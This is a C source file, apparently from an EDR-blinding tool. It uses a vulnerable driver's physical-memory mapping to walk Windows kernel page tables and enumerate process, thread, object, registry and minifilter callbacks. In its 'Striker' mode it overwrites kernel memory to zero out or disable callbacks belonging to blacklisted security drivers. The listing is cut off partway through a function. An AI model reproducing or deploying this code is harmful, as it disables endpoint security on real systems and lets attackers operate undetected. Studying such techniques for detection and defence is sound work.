#include "Header.h"


BOOL IsEDR(CHAR* name) {
    if (name == NULL) return FALSE;

    int count = sizeof(blacklist) / sizeof(blacklist[0]);

    for (int i = 0; i < count; i++) {
        
        if (_stricmp(name, blacklist[i]) == 0) {
            return TRUE;
        }
    }
    return FALSE;
}

// Reads a 64-bit little-endian value from the mapped physical memory window.
UINT64 ReadMemoryU64(BYTE* map, UINT64 physicalAddress, UINT64 mapSize)
{
    if (physicalAddress + 8 > mapSize)
        return 0;

    UINT64 v = 0;
    for (int i = 0; i < 8; i++)
        v |= ((UINT64)map[physicalAddress + i]) << (i * 8);

    return v;
}

// Writes a 64-bit little-endian value into the mapped physical memory window.
VOID WriteMemoryU64(BYTE* map, UINT64 physicalAddress, UINT64 value, UINT64 mapSize)
{
   
    if (physicalAddress + 8 > mapSize)
        return;

    for (int i = 0; i < 8; i++)
    {

        map[physicalAddress + i] = (BYTE)((value >> (i * 8)) & 0xFF);
    }
}

// Translates a kernel virtual address to a physical address by walking x64 page tables.
UINT64 VirtualToPhysical(UINT64 cr3, UINT64 virtualAddr, BYTE* map, UINT64 mapSize)
{
    UINT64 PML4 = (virtualAddr >> 39) & 0x1FF;
    UINT64 PDPT = (virtualAddr >> 30) & 0x1FF;
    UINT64 PD = (virtualAddr >> 21) & 0x1FF;
    UINT64 PT = (virtualAddr >> 12) & 0x1FF;

    UINT64 cr3Base = cr3 & 0x000FFFFFFFFFF000ULL;

    UINT64 pml4eAddr = cr3Base + PML4 * 8;
    UINT64 PML4E = ReadMemoryU64(map, pml4eAddr, mapSize);
    if (!(PML4E & 1)) return 0;

    UINT64 pdptBase = PML4E & 0x000FFFFFFFFFF000ULL;
    UINT64 PDPTE = ReadMemoryU64(map, pdptBase + PDPT * 8, mapSize);
    if (!(PDPTE & 1)) return 0;

    if (PDPTE & (1 << 7))
        return (PDPTE & 0x000FFFFFC0000000ULL) + (virtualAddr & 0x3FFFFFFFULL);

    UINT64 pdBase = PDPTE & 0x000FFFFFFFFFF000ULL;
    UINT64 PDE = ReadMemoryU64(map, pdBase + PD * 8, mapSize);
    if (!(PDE & 1)) return 0;

    if (PDE & (1 << 7))
        return (PDE & 0x000FFFFFFFE00000ULL) + (virtualAddr & 0x1FFFFFULL);

    UINT64 ptBase = PDE & 0x000FFFFFFFFFF000ULL;
    UINT64 PTE = ReadMemoryU64(map, ptBase + PT * 8, mapSize);
    if (!(PTE & 1)) return 0;

    return (PTE & 0x000FFFFFFFFFF000ULL) + (virtualAddr & 0xFFFULL);
}


UINT64 UnMapViewOfSection(HANDLE drv, PHYSICAL_MEMORY_READ* map) {
    DWORD bytes_returned;
    BOOL success = DeviceIoControl(
        drv,
        IOCTL_WINIO_UNMAPPHYSADDR,
        map,
        sizeof(PHYSICAL_MEMORY_READ),
        map,
        sizeof(PHYSICAL_MEMORY_READ),
        &bytes_returned,
        (LPOVERLAPPED)NULL
    );
    if (success) {
        printf("[+] Physical Memory Section Unmapped Successfully\n");
        return TRUE;
    }
    printf("[!] Failed to unmap physical memory section\n");
    return FALSE;
}

UINT64 GetModuleBase(const char* moduleName) {
    LPVOID drivers[1024];
    DWORD cbNeeded;
    int cDrivers, i;

    // Enumerate loaded kernel modules.
    if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers)) {
        char szDriver[1024];
        cDrivers = cbNeeded / sizeof(drivers[0]);

        for (i = 0; i < cDrivers; i++) {
            // Resolve the base name for each loaded module.
            if (GetDeviceDriverBaseNameA(drivers[i], szDriver, sizeof(szDriver))) {
                if (_stricmp(szDriver, moduleName) == 0) {
                    // Return the kernel base address for the matching module.
                    return (UINT64)drivers[i];
                }
            }
        }
    }

    printf("[-] Error: Could not find base address for %s\n", moduleName);
    return 0;
}

CHAR* GetDriverName(INT64 DriverCallBackFuncAddr) {
    DWORD bytesNeeded = 0;

    if (EnumDeviceDrivers(NULL, 0, &bytesNeeded)) {
        DWORD arraySize = bytesNeeded / 8;
        DWORD arraySizeByte = bytesNeeded;
        INT64* addressArray = (INT64*)malloc(arraySizeByte);

        if (addressArray == NULL) return NULL;
        EnumDeviceDrivers((LPVOID*)addressArray, arraySizeByte, &bytesNeeded);
        INT64* arrayMatch = (INT64*)malloc(arraySizeByte + 100);

        if (arrayMatch == NULL) return NULL;
        INT j = 0;

        for (DWORD i = 0; i < arraySize - 1; i++) {
            // && (DriverCallBackFuncAddr < addressArray[i + 1])
            if ((DriverCallBackFuncAddr > (INT64)addressArray[i])) {
                arrayMatch[j] = addressArray[i];
                j++;
            }
        }
        INT64 tmp = 0;
        INT64 matchAddr = 0;
        for (int i = 0; i < j; i++) {
            if (i == 0) {
                tmp = _abs64(DriverCallBackFuncAddr - arrayMatch[i]);
                matchAddr = arrayMatch[i];

            }
            else if (_abs64(DriverCallBackFuncAddr - arrayMatch[i]) < tmp) {
                tmp = _abs64(DriverCallBackFuncAddr - arrayMatch[i]);
                matchAddr = arrayMatch[i];
            }
        }

        CHAR* driverName = (CHAR*)calloc(1024, 1);
        if (GetDeviceDriverBaseNameA((LPVOID)matchAddr, driverName, 1024) > 0) {
            //printf("%I64x\t%s", MatchAddr,DriverName);
            return driverName;

        }
        free(addressArray);
        free(arrayMatch);
        free(driverName);
    }
    return NULL;
}

VOID DisplayNotifyCallbacksDrivers(UINT64 notifyCallbackAddr, UINT64 cr3, BYTE* phys, UINT64 physSize) {
   
    UINT64 arrayPhys = VirtualToPhysical(cr3, notifyCallbackAddr, phys, physSize);
    if (arrayPhys) {
        printf("[+] Physical Address: 0x%llx\n", arrayPhys);

        for (int j = 0; j < 64; j++) {
          
            UINT64 entry = ReadMemoryU64(phys, arrayPhys + (j * 8), physSize);

            if (entry == 0) continue;

 
            UINT64 blockVA = entry & ~0xFULL;

            UINT64 blockPhys = VirtualToPhysical(cr3, blockVA, phys, physSize);

            if (blockPhys == 0) {
                printf("  [%d] Entry: 0x%llx | Failed to translate Block VA 0x%llx\n", j, entry, blockVA);
                continue;
            }

       
            UINT64 callbackFn = ReadMemoryU64(phys, blockPhys + 8, physSize);

            if (callbackFn == 0 ||  callbackFn < 0xFFFF000000000000) {
                callbackFn = ReadMemoryU64(phys, blockPhys, physSize);
                continue;
            }

            //printf("  [%d] BlockVA: 0x%llx | Routine: 0x%llx\n", j, blockVA, callbackFn);

            CHAR* driversName = GetDriverName(callbackFn);
            if (driversName != NULL) {
                printf(" [%d] \t 0x%llx => [%s] \n", j, callbackFn, driversName);
            }

        }
    }
}

VOID DisplayObCallbacks(UINT64 pObjectTypeVA, UINT64 cr3, BYTE* phys, UINT64 physSize, const char* typeName) {
    printf("\n[!] Analysis of ObCallbacks for %s (VA: 0x%llx)\n", typeName, pObjectTypeVA);

    // Translate the exported pointer address.
    UINT64 pExportPhys = VirtualToPhysical(cr3, pObjectTypeVA, phys, physSize);
    if (!pExportPhys) {
        printf("[!] Failed to translate Export VA to Physical\n");
        return;
    }

    // Read the exported pointer to recover the _OBJECT_TYPE structure address.
    UINT64 objectTypeStructVA = ReadMemoryU64(phys, pExportPhys, physSize);
    if (objectTypeStructVA < 0xFFFF000000000000) {
        printf("[!] Invalid ObjectType Structure VA: 0x%llx\n", objectTypeStructVA);
        return;
    }
    printf("[+] %s Structure found at VA: 0x%llx\n", typeName, objectTypeStructVA);

    // Reach the CallbackList field. The offset is version-sensitive.
    UINT64 callbackListHeadVA = objectTypeStructVA + 0xC8;
    UINT64 listHeadPhys = VirtualToPhysical(cr3, callbackListHeadVA, phys, physSize);
    if (!listHeadPhys) return;

    UINT64 currentEntryVA = ReadMemoryU64(phys, listHeadPhys, physSize);

    int count = 0;
    while (currentEntryVA != callbackListHeadVA && currentEntryVA != 0 && count < 64) {
        UINT64 entryPhys = VirtualToPhysical(cr3, currentEntryVA, phys, physSize);
        if (!entryPhys) break;

        // On recent builds, LIST_ENTRY is usually at offset 0x0 in _OB_CALLBACK_ENTRY.
        // The Item pointer, which references _OB_CALLBACK_ENTRY_ITEM, is expected at 0x20.

        UINT64 callbackItemVA = ReadMemoryU64(phys, entryPhys + 0x20, physSize);

        if (callbackItemVA > 0xFFFF000000000000) {
            UINT64 itemPhys = VirtualToPhysical(cr3, callbackItemVA, phys, physSize);
            if (itemPhys) {
                // PreOperation is expected at offset 0x28 in _OB_CALLBACK_ENTRY_ITEM.
                UINT64 preNotify = ReadMemoryU64(phys, itemPhys + 0x28, physSize);

                if (preNotify > 0xFFFF000000000000) {
                    CHAR* drvName = GetDriverName(preNotify);
                    printf(" [%d] Callback detecte ! Pre: 0x%llx => [%s]\n", count, preNotify, drvName ? drvName : "Unknown");
                }
            }
        }

        // Move to the next Flink.
        currentEntryVA = ReadMemoryU64(phys, entryPhys, physSize);
        count++;
    }

    if (count == 0) printf(" [-] No callbacks found for this object type.\n");
}
UINT64 FindNotifyRoutineArray(HMODULE hNtos, UINT64 kernelBase, LPCSTR exportName) {

    BYTE* localExportAddr = (BYTE*)GetProcAddress(hNtos, exportName);
    if (!localExportAddr) return 0;

    int callOffset = -1;
    for (int i = 0; i < 32; i++) {
        if (localExportAddr[i] == 0xE8) {
            callOffset = i;
            break;
        }
    }

    if (callOffset == -1) return 0;

    UINT64 PsSetVA = (UINT64)GetProcAddress(hNtos, exportName) - (UINT64)hNtos + kernelBase;
    UINT64 kernelInstructionAddr = PsSetVA + callOffset;
    INT32 displacement = *(INT32*)(localExportAddr + callOffset + 1);
    UINT64 internalWorkerVA = kernelInstructionAddr + 5 + displacement;

    UINT64 internalOffset = internalWorkerVA - kernelBase;
    BYTE* localInternalAddr = (BYTE*)hNtos + internalOffset;

    for (int i = 0; i < 512; i++) {
        // Looking for patterns LEA RCX, [RIP + offset]
        bool isLea = (localInternalAddr[i] == 0x48 || localInternalAddr[i] == 0x4C)
            && localInternalAddr[i + 1] == 0x8D
            && (localInternalAddr[i + 2] & 0x07) == 0x05;

        if (isLea) {
            UINT64 leaInstructionKernelVA = internalWorkerVA + i;
            INT32 leaDisplacement = *(INT32*)(localInternalAddr + i + 3);

   
            return leaInstructionKernelVA + 7 + leaDisplacement;
        }
    }

    return 0;

}


UINT64 GetFuncAddr(HMODULE hNtos, UINT64 kernelBase, CHAR* FuncName) {

    if (hNtos == NULL) return 0;
    VOID* PocAddress = (VOID*)GetProcAddress(hNtos, FuncName);
    INT64 Offset = (INT64)PocAddress - (INT64)hNtos;
    return (INT64)kernelBase + Offset;
}

INT64 GetMinifilterFuncAddress(const char* ModuleName, const CHAR* FuncName) {
    UINT64 KBase = GetModuleBase(ModuleName);
    if (!KBase) {
        printf("[-] Base not found for %s\n", ModuleName);
        return 0;
    }

    CHAR FullPath[MAX_PATH];
    CHAR sysDir[MAX_PATH];
    GetSystemDirectoryA(sysDir, MAX_PATH);

    // Resolve the on-disk path depending on the module type.
    if (_stricmp(ModuleName, "ntoskrnl.exe") == 0 ||
        _stricmp(ModuleName, "ntkrnlmp.exe") == 0) {
        snprintf(FullPath, MAX_PATH, "%s\\%s", sysDir, ModuleName);
    }
    else {
        // Kernel drivers such as fltmgr.sys live under System32\drivers.
        snprintf(FullPath, MAX_PATH, "%s\\drivers\\%s", sysDir, ModuleName);
    }

    HMODULE hMod = LoadLibraryExA(FullPath, NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (!hMod) {
        printf("[-] LoadLibraryEx echoue pour %s (0x%lx)\n", FullPath, GetLastError());
        return 0;
    }

    FARPROC funcAddr = GetProcAddress(hMod, FuncName);
    if (!funcAddr) {
        printf("[-] Export '%s' not found\n", FuncName);
        FreeLibrary(hMod);
        return 0;
    }

    UINT64 offset = (UINT64)funcAddr - (UINT64)hMod;
    UINT64 result = KBase + offset;

    printf("[+] %s!%s => user: 0x%llx | kernel: 0x%llx\n",
        ModuleName, FuncName, (UINT64)funcAddr, result);

    FreeLibrary(hMod);
    return (INT64)result;
}


UINT64 GetObjectTypeAddrByScan(HMODULE hNtos, UINT64 kernelBase, UINT64 cr3, BYTE* phys, UINT64 physSize, int flag) {
    // Select an exported routine that references the target object type pointer.
    const char* funcName = (flag == 1) ? "NtDuplicateObject" : "NtOpenThreadTokenEx";
    UINT64 funcVA = GetFuncAddr(hNtos, kernelBase, (CHAR*)funcName);
    if (!funcVA) return 0;

    // Scan the function body for the MOV R8, [RIP+disp32] pattern.
    BYTE buffer[3];
    UINT64 targetInstrVA = 0;

    for (int i = 0; i < 400; i++) {
        UINT64 currentVA = funcVA + i;
        UINT64 pa = VirtualToPhysical(cr3, currentVA, phys, physSize);
        if (!pa) continue;

        // Read the opcode bytes used for pattern validation.
        for (int j = 0; j < 3; j++) buffer[j] = phys[pa + j];

        if (buffer[0] == 0x4C && buffer[1] == 0x8B && buffer[2] == 0x05) {
            targetInstrVA = currentVA;
            break;
        }
    }

    if (!targetInstrVA) return 0;

    // Extract the RIP-relative displacement.
    UINT64 paOffset = VirtualToPhysical(cr3, targetInstrVA + 3, phys, physSize);
    INT32 relativeOffset = *(INT32*)(&phys[paOffset]);

    // Compute the pointer VA. The MOV R8, [RIP+disp32] instruction is 7 bytes long.
    UINT64 pointerVA = targetInstrVA + 7 + relativeOffset;

    // Dereference the pointer to get the _OBJECT_TYPE structure address.
    UINT64 paPointer = VirtualToPhysical(cr3, pointerVA, phys, physSize);
    return ReadMemoryU64(phys, paPointer, physSize);
}

VOID AuditObRegisterCallbacks(UINT64 objectTypeVA, UINT64 cr3, BYTE* phys, UINT64 physSize, int flag) {
    UINT64 listHeadVA = objectTypeVA + 0xC8; // Offset CallbackList
    UINT64 paListHead = VirtualToPhysical(cr3, listHeadVA, phys, physSize);
    if (!paListHead) return;

    // Read the first list entry through Flink.
    UINT64 currentEntryVA = ReadMemoryU64(phys, paListHead, physSize);

    int count = 0;
    while (currentEntryVA != listHeadVA && currentEntryVA != 0 && count < 20) {
        UINT64 paEntry = VirtualToPhysical(cr3, currentEntryVA, phys, physSize);
        if (!paEntry) break;

        // Validate that the entry belongs to the expected object type.
        UINT64 parentTypeVA = ReadMemoryU64(phys, paEntry + 0x20, physSize);
        if (parentTypeVA != objectTypeVA) {
            // Skip unexpected layouts to avoid corrupting unrelated kernel memory.
            currentEntryVA = ReadMemoryU64(phys, paEntry, physSize);
            continue;
        }

        // Read the Enabled flag. It is treated as a 4-byte BOOL on this target build.
        DWORD enabled = *(DWORD*)(&phys[paEntry + 0x14]);

        // Recover the PreOperation callback pointer.
        UINT64 preOpVA = ReadMemoryU64(phys, paEntry + 0x28, physSize);

        if (preOpVA > 0xFFFF000000000000) {
            CHAR* drvName = GetDriverName(preOpVA);

            printf("   [%d] Status: %s | Driver: [%-15s] | PreOp: 0x%llx\n",
                count,
                enabled ? "ENABLED " : "DISABLED",
                drvName ? drvName : "Unknown",
                preOpVA);

            if (flag == 1) {
                // Striker mode can disable a callback by clearing its Enabled flag.
                if (IsEDR(drvName) && enabled) {
                    printf("      [!] EDR detected. Disabling callback via flag...\n");
                    // Write FALSE to the physical address backing the Enabled flag.
                    *(DWORD*)(&phys[paEntry + 0x14]) = 0;
                    printf("      [+] Success: Callback blinded.\n");
                }
            }

            if (drvName) free(drvName);
        }

        // Move to the next list entry through Flink.
        currentEntryVA = ReadMemoryU64(phys, paEntry, physSize);
        count++;
    }
}
VOID RemoveObRegisterCallbacks(UINT64 objectTypeStructVA, UINT64 cr3, BYTE* phys, UINT64 physSize, int flag) {
    const char* typeName = (flag == 1) ? "PsProcessType" : "PsThreadType";
    UINT64 listHeadVA = objectTypeStructVA + 0xC8;
    UINT64 paListHead = VirtualToPhysical(cr3, listHeadVA, phys, physSize);

    if (!paListHead) return;

    UINT64 currentEntryVA = ReadMemoryU64(phys, paListHead, physSize);
    if (currentEntryVA == listHeadVA || currentEntryVA == 0) return;

    printf("\n[+] Enumeration %s (Head: 0x%llx)\n", typeName, listHeadVA);

    int count = 0;
    while (currentEntryVA != listHeadVA && currentEntryVA != 0 && count < 15) {
        UINT64 paEntry = VirtualToPhysical(cr3, currentEntryVA, phys, physSize);
        if (!paEntry) break;

        // On recent builds, CallbackEntryItem is often found at +0x18.
        // Try +0x18 first, then +0x20, and keep whichever looks like a valid kernel VA.
        UINT64 itemPtrVA = ReadMemoryU64(phys, paEntry + 0x18, physSize);

        // If +0x18 does not look like a kernel address, try the alternate +0x20 layout.
        if (itemPtrVA < 0xFFFF000000000000) {
            itemPtrVA = ReadMemoryU64(phys, paEntry + 0x20, physSize);
        }

        UINT64 paItem = VirtualToPhysical(cr3, itemPtrVA, phys, physSize);
        if (paItem) {
            // Inside the item, PreOperation is expected at +0x28.
            UINT64 preOpVA = ReadMemoryU64(phys, paItem + 0x28, physSize);

            if (preOpVA > 0xFFFF000000000000) {
                CHAR* drvName = GetDriverName(preOpVA);
                printf("  |-- [%d] Driver: %-15s | PreOp: 0x%llx\n", count, drvName ? drvName : "Unknown", preOpVA);
                if (drvName) free(drvName);
            }
            else {
                // If decoding still fails, print the raw item pointer for debugging.
                printf("  |-- [%d] Item VA: 0x%llx (PreOp lue: 0x%llx)\n", count, itemPtrVA, preOpVA);
            }
        }

        currentEntryVA = ReadMemoryU64(phys, paEntry, physSize);
        count++;
    }
}

VOID DisplayObCallbacksFromStruct(UINT64 structVA, UINT64 cr3, BYTE* phys, UINT64 physSize) {
    UINT64 listHeadVA = structVA + 0xC8; // CallbackList offset
    UINT64 listHeadPA = VirtualToPhysical(cr3, listHeadVA, phys, physSize);
    if (!listHeadPA) return;

    UINT64 currentEntryVA = ReadMemoryU64(phys, listHeadPA, physSize);
    int count = 0;

    while (currentEntryVA != listHeadVA && currentEntryVA != 0 && count < 32) {
        UINT64 entryPA = VirtualToPhysical(cr3, currentEntryVA, phys, physSize);
        if (!entryPA) break;

        // Item pointer at offset +0x20.
        UINT64 itemVA = ReadMemoryU64(phys, entryPA + 0x20, physSize);
        UINT64 itemPA = VirtualToPhysical(cr3, itemVA, phys, physSize);

        if (itemPA) {
            UINT64 preNotify = ReadMemoryU64(phys, itemPA + 0x28, physSize);
            if (preNotify > 0xFFFF000000000000) {
                printf(" [%d] PreOperation: 0x%llx => [%s]\n", count, preNotify, GetDriverName(preNotify));
            }
        }
        currentEntryVA = ReadMemoryU64(phys, entryPA, physSize);
        count++;
    }
}

VOID StrikerByBlacklist(UINT64 arrayVA, UINT64 cr3, BYTE* phys, UINT64 physSize, const char** blacklist, int blacklistCount) {
    UINT64 arrayPhys = VirtualToPhysical(cr3, arrayVA, phys, physSize);
    if (!arrayPhys) return;

    for (int j = 0; j < 64; j++) {
        UINT64 entry = ReadMemoryU64(phys, arrayPhys + (j * 8), physSize);
        if (entry == 0) continue;

        // Extract the callback function address as done in DisplayNotifyCallbacksDrivers.
        UINT64 blockVA = entry & ~0xFULL;
        UINT64 blockPhys = VirtualToPhysical(cr3, blockVA, phys, physSize);
        if (blockPhys == 0) continue;

        UINT64 callbackFn = ReadMemoryU64(phys, blockPhys + 8, physSize);
        if (callbackFn < 0xFFFF000000000000) {
            callbackFn = ReadMemoryU64(phys, blockPhys, physSize);
        }

        // Resolve the owning driver name.
        CHAR* driverName = GetDriverName(callbackFn);
        if (driverName != NULL) {
            // Check whether the driver is in the configured target list.
            for (int i = 0; i < blacklistCount; i++) {
                if (_stricmp(driverName, blacklist[i]) == 0) {
                    printf("[!] TARGET FOUND: %s at index [%d]. Neutralization...\n", driverName, j);

                    // Clear the callback array entry.
                    WriteMemoryU64(phys, arrayPhys + (j * 8), 0, physSize);

                    printf("[+] %s was successfully blinded.\n", driverName);
                }
            }
            free(driverName);
        }
    }
}

VOID ClearCmRegisterCallback(HMODULE hNtos, UINT64 kernelBase, UINT64 cr3, BYTE* phys, UINT64 physSize, BOOL strikerMode) {
    printf("\n[!] Analysis of Registry Callbacks (Configuration Manager)\n");

    // Resolve CmUnRegisterCallback, used here as the signature donor.
    UINT64 funcVA = GetFuncAddr(hNtos, kernelBase, (CHAR*)"CmUnRegisterCallback");
    if (!funcVA) return;

    // Scan for LEA RCX, [CmpCallbackListHead] (48 8d 0d).
    UINT64 targetInstrVA = 0;
    for (int i = 0; i < 400; i++) {
        UINT64 currentVA = funcVA + i;
        UINT64 pa = VirtualToPhysical(cr3, currentVA, phys, physSize);
        if (!pa) continue;

        // Pattern: 48 8d 0d (LEA RCX, [RIP + offset])
        if (phys[pa] == 0x48 && phys[pa + 1] == 0x8D && phys[pa + 2] == 0x0D) {
            // Optional context check for higher precision (48 8d 54).
            UINT64 prevPA = VirtualToPhysical(cr3, currentVA - 5, phys, physSize);
            if (prevPA && phys[prevPA] == 0x48 && phys[prevPA + 1] == 0x8D && phys[prevPA + 2] == 0x54) {
                targetInstrVA = currentVA;
                break;
            }
        }
    }

    if (!targetInstrVA) {
        printf(" [-] Failed to find Registry Callback list signature.\n");
        return;
    }

    // Compute the CmpCallbackListHead virtual address.
    UINT64 paOffset = VirtualToPhysical(cr3, targetInstrVA + 3, phys, physSize);
    INT32 displacement = *(INT32*)(&phys[paOffset]);
    UINT64 callbackListHeadPtrVA = targetInstrVA + 7 + displacement;

    // Walk and display registered callback subscribers.
    UINT64 paListHead = VirtualToPhysical(cr3, callbackListHeadPtrVA, phys, physSize);
    UINT64 currentEntryVA = ReadMemoryU64(phys, paListHead, physSize);
    UINT64 firstEntryVA = currentEntryVA;

    if (currentEntryVA == 0 || currentEntryVA == callbackListHeadPtrVA) {
        printf(" [-] No Registry Callbacks registered.\n");
        return;
    }

    int count = 0;
    printf("--------------------------------------------------------------------\n");
    printf(" Drivers registered to CmRegisterCallback :\n");
    printf("--------------------------------------------------------------------\n");

    do {
        UINT64 paEntry = VirtualToPhysical(cr3, currentEntryVA, phys, physSize);
        if (!paEntry) break;

        // The callback function is expected at offset 0x28 in _CM_CALLBACK_CONTEXT_BLOCK.
        UINT64 callBackFuncAddr = ReadMemoryU64(phys, paEntry + 0x28, physSize);
        CHAR* drvName = GetDriverName(callBackFuncAddr);

        printf(" [%d] 0x%llx => [%s]\n", count, callBackFuncAddr, drvName ? drvName : "Unknown");
        if (drvName) free(drvName);

        // Move to the next entry. Flink is at offset 0x0.
        currentEntryVA = ReadMemoryU64(phys, paEntry, physSize);
        count++;

    } while (currentEntryVA != 0 && currentEntryVA != firstEntryVA && count < 32);

    // Neutralization phase, only when Striker mode is enabled.
    if (strikerMode) {
        printf("\n[!] STRIKER: Clearing all registry callbacks...\n");
        // Make the list head point to itself to detach the list.
        WriteMemoryU64(phys, paListHead, callbackListHeadPtrVA, physSize);
        // Keep Blink consistent with the self-referencing list head.
        WriteMemoryU64(phys, paListHead + 8, callbackListHeadPtrVA, physSize);
        printf("[+] CmpCallbackListHead successfully reset.\n");
    }
}

VOID ClearCmRegisterCallback(HMODULE hNtos, UINT64 kernelBase, UINT64 cr3, BYTE* phys, UINT64 physSize) {
    printf("\n[!] Analysis of Registry Callbacks (CallbackListHead)\n");

    // Resolve CmUnRegisterCallback.
    UINT64 funcVA = GetFuncAddr(hNtos, kernelBase, (CHAR*)"CmUnRegisterCallback");
    if (!funcVA) return;

    // Scan for LEA RCX, [CmpCallbackListHead] (48 8d 0d).
    UINT64 targetInstrVA = 0;
    BYTE buffer[3];
    for (int i = 0; i < 300; i++) {
        UINT64 currentVA = funcVA + i;
        UINT64 pa = VirtualToPhysical(cr3, currentVA, phys, physSize);
        if (!pa) continue;

        buffer[0] = phys[pa];
        buffer[1] = phys[pa + 1];
        buffer[2] = phys[pa + 2];

        if (buffer[0] == 0x48 && buffer[1] == 0x8D && buffer[2] == 0x0D) {
            // Validate the preceding instruction context (48 8d 54).
            UINT64 prevPA = VirtualToPhysical(cr3, currentVA - 5, phys, physSize);
            if (prevPA && phys[prevPA] == 0x48 && phys[prevPA + 1] == 0x8D && phys[prevPA + 2] == 0x54) {
                targetInstrVA = currentVA;
                break;
            }
        }
    }

    if (!targetInstrVA) {
        printf("[-] Failed to find CmpCallbackListHead signature.\n");
        return;
    }

    // Compute CallbackListHead through RIP-relative addressing.
    UINT64 paOffset = VirtualToPhysical(cr3, targetInstrVA + 3, phys, physSize);
    INT32 displacement = *(INT32*)(&phys[paOffset]);
    UINT64 callbackListHeadPtrVA = targetInstrVA + 7 + displacement;

    // Walk the linked list.
    UINT64 paListHeadPtr = VirtualToPhysical(cr3, callbackListHeadPtrVA, phys, physSize);
    UINT64 currentEntryVA = ReadMemoryU64(phys, paListHeadPtr, physSize);
    UINT64 firstEntryVA = currentEntryVA;

    if (currentEntryVA == 0 || currentEntryVA == callbackListHeadPtrVA) {
        printf(" [-] No Registry Callbacks found.\n");
        return;
    }

    do {
        UINT64 paEntry = VirtualToPhysical(cr3, currentEntryVA, phys, physSize);
        if (!paEntry) break;

        // The callback function is expected at offset 0x28 on this x64 target build.
        UINT64 callBackFuncAddr = ReadMemoryU64(phys, paEntry + 0x28, physSize);
        CHAR* drvName = GetDriverName(callBackFuncAddr);

        printf(" [+] Callback: 0x%llx => [%s]\n", callBackFuncAddr, drvName ? drvName : "Unknown");
        if (drvName) free(drvName);

        // Move to the next entry through Flink at offset 0x0.
        currentEntryVA = ReadMemoryU64(phys, paEntry, physSize);

    } while (currentEntryVA != 0 && currentEntryVA != firstEntryVA);

    // STRIKE: clear the list by making the list head point to itself.
    WriteMemoryU64(phys, paListHeadPtr, callbackListHeadPtrVA, physSize);
    printf("\n[STRIKE] CmpCallbackListHead has been cleared (Pointed to itself).\n");
}

CHAR* GetMinifilterName(UINT64 filterStructVA, UINT64 cr3, BYTE* phys, UINT64 physSize) {
    // Offset confirmed with WinDbg: +0x040 Name : _UNICODE_STRING.
    UINT64 unicodeStrAddr = filterStructVA + 0x40;

    UINT64 paUnicode = VirtualToPhysical(cr3, unicodeStrAddr, phys, physSize);
    if (!paUnicode) return NULL;

    USHORT length = *(USHORT*)(&phys[paUnicode]);
    UINT64 bufferVA = *(UINT64*)(&phys[paUnicode + 8]);

    if (length == 0 || length > 512 || !bufferVA) return NULL;

    UINT64 paBuffer = VirtualToPhysical(cr3, bufferVA, phys, physSize);
    if (!paBuffer) return NULL;

    CHAR* asciiName = (CHAR*)malloc((length / 2) + 1);
    if (!asciiName) return NULL;

    for (int i = 0; i < length / 2; i++) {
        asciiName[i] = (CHAR)phys[paBuffer + (i * 2)];
    }
    asciiName[length / 2] = '\0';

    return asciiName;
}
VOID AuditMiniFilters(HMODULE hFltMgr, UINT64 fltMgrBase, UINT64 cr3, BYTE* phys, UINT64 physSize) {
    printf("\n[!] Analysis of File System Minifilters\n");

    // Locate FltGlobals through FltEnumerateFilters.
    UINT64 funcVA = GetMinifilterFuncAddress((CHAR*)"FLTMGR.sys", (CHAR*)"FltEnumerateFilters");//GetFuncAddr(hFltMgr, fltMgrBase, (CHAR*)"FltEnumerateVolumes");
    printf("[+] FltEnumerateFilters found at: 0x%llx\n", funcVA);

    if (!funcVA) return;

    UINT64 targetInstrVA = 0;
    for (int i = 0; i < 400; i++) {
        UINT64 currentVA = funcVA + i;
        UINT64 pa = VirtualToPhysical(cr3, currentVA, phys, physSize);
        if (!pa || pa + 3 >= physSize) continue;

        if (phys[pa] == 0x48 && phys[pa + 1] == 0x8D && phys[pa + 2] == 0x05) {
            targetInstrVA = currentVA;
            break;
        }
    }

    if (!targetInstrVA) return;

    // Resolve the FLT_FRAME structure.
    UINT64 paOffset = VirtualToPhysical(cr3, targetInstrVA + 3, phys, physSize);
    INT32 displacement = *(INT32*)(&phys[paOffset]);
    UINT64 framePtrVA = targetInstrVA + 7 + displacement;
    UINT64 fltFrameVA = ReadMemoryU64(phys, VirtualToPhysical(cr3, framePtrVA, phys, physSize), physSize) - 0x8;

    printf("[+] FLT_FRAME found at: 0x%llx\n", fltFrameVA);

    // Enumerate global filters.
    // If 0x50 does not return entries on a target build, try adjusting to 0x48.
    UINT64 filterListHeadVA = fltFrameVA + 0x48;
    // Read the first element.
    UINT64 currentFilterLinkVA = ReadMemoryU64(phys, VirtualToPhysical(cr3, filterListHeadVA, phys, physSize), physSize);

    // In Resource List style LIST_ENTRY layouts, Flink can point to the header start.
    // Keep the validation conservative to avoid stopping too early.
    printf("\n--- Registered Filters ---\n");
    for (int i = 0; i < 64; i++) {
        // Reaching the header again means the walk is complete.
        if (currentFilterLinkVA == filterListHeadVA || currentFilterLinkVA == 0) break;

        // Conservative read attempt.
        UINT64 paFilterLink = VirtualToPhysical(cr3, currentFilterLinkVA, phys, physSize);
        if (!paFilterLink) break;

        UINT64 filterStructVA = currentFilterLinkVA - 0x10;
        CHAR* name = GetMinifilterName(filterStructVA, cr3, phys, physSize);

        // If the name is NULL, this may not be a FLT_FILTER.
        // Still print the entry to help validate memory walking progress.
        printf(" [%02d] Filter: %-15s | VA: 0x%llx\n", i, name ? name : "Checking...", filterStructVA);
        if (name) free(name);

        // Move to the next entry.
        currentFilterLinkVA = ReadMemoryU64(phys, paFilterLink, physSize);
    }
     // Enumerate volumes and their instances.
    // AttachedVolumes is at +0xC8. The LIST_ENTRY is at +0xD0.
    UINT64 volumeListHeadVA = fltFrameVA + 0xD0;
    UINT64 currentVolLinkVA = ReadMemoryU64(phys, VirtualToPhysical(cr3, volumeListHeadVA, phys, physSize), physSize);

    printf("\n--- Volumes & Attached Instances ---\n");
    int volIdx = 0;
    while (currentVolLinkVA != volumeListHeadVA && currentVolLinkVA != 0 && volIdx < 10) {
        UINT64 volumeStructVA = currentVolLinkVA - 0x10;
        printf(" Volume [%d] (VA: 0x%llx)\n", volIdx, volumeStructVA);

        // Instances are usually at volume offset 0x130 on Win11 or 0x120 on Win10.
        // Scan the instance list conservatively.
        UINT64 instListHeadVA = volumeStructVA + 0x130;
        UINT64 currentInstLinkVA = ReadMemoryU64(phys, VirtualToPhysical(cr3, instListHeadVA, phys, physSize), physSize);

        int instIdx = 0;
